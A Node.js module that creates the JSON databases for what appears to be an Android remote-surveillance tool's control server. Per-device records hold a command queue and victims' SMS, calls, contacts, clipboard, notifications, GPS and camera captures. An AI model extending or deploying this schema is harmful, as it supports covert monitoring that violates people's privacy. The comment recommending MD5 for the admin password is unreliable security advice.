const fs = require('fs');
const path = require('path');
const lowdb = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');

// Setup paths
const baseDir = path.resolve(__dirname, '../database');
const clientDir = path.join(baseDir, 'clientData');
const downloadsDir = path.join(baseDir, 'client_downloads');
const photosDir = path.join(baseDir, 'client_photos');

// Create folders if missing
if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });
if (!fs.existsSync(clientDir)) fs.mkdirSync(clientDir, { recursive: true });
if (!fs.existsSync(downloadsDir)) fs.mkdirSync(downloadsDir, { recursive: true });
if (!fs.existsSync(photosDir)) fs.mkdirSync(photosDir, { recursive: true });

// Main DB setup
const mainDBPath = path.join(baseDir, 'maindb.json');
const maindb = lowdb(new FileSync(mainDBPath));

// Log DB setup (separate from main DB)
const logDBPath = path.join(baseDir, 'log.json');
const logdb = lowdb(new FileSync(logDBPath));

// Default admin + structure
maindb.defaults({
  admin: {
    username: 'admin',
    password: '',            // should be MD5
    loginToken: '',
    ipLog: []
  },
  clients: []
}).write();

// Default log structure
logdb.defaults({
  logs: []
}).write();

// Per-client DB structure
class ClientDB {
  constructor(clientID) {
    const file = path.join(clientDir, `${clientID}.json`);
    const db = lowdb(new FileSync(file));

    db.defaults({
      clientID,
      CommandQue: [],
      SMSData: [],
      CallData: [],
      contacts: [],
      wifiNow: [],
      wifiLog: [],
      clipboardLog: [],
      notificationLog: [],
      enabledPermissions: [],
      apps: [],
      GPSData: [],
      GPSSettings: { updateFrequency: 0 },
      downloads: [],
      currentFolder: [],
      availableCameras: [],
      cameraShots: [],
      fileStatus: {
        lastError: null,
        lastUpdated: null,
        lastPath: null
      },
      smsStatus: {
        lastError: null,
        lastUpdated: null,
        itemCount: 0,
        truncated: false
      },
      wifiStatus: {
        lastError: null,
        lastUpdated: null,
        networkCount: 0,
        scanRequested: false,
        lastScanTimestamp: null,
        locationEnabled: null,
        hasFineLocation: null,
        hasCoarseLocation: null
      },
      appsStatus: {
        lastError: null,
        lastUpdated: null,
        appCount: 0,
        includeSystem: null,
        totalPackages: null,
        returnedPackages: null,
        filtered: null
      },
      clipboardStatus: {
        lastUpdated: null,
        lastError: null
      }
    }).write();

    return db;
  }
}

// Export
module.exports = {
  maindb,
  logdb,
  clientdb: ClientDB
};